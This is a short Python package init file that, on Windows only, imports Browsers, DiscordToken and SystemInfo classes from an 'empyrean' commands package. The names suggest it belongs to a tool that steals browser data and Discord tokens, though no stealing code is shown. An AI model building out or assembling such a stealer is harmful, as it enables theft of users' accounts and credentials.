import sys

if sys.platform == "win32":
    from src.commands.empyrean.browsers import Browsers
    from src.commands.empyrean.discordtoken import DiscordToken
    from src.commands.empyrean.systeminfo import SystemInfo

    __all__ = [Browsers, DiscordToken, SystemInfo]
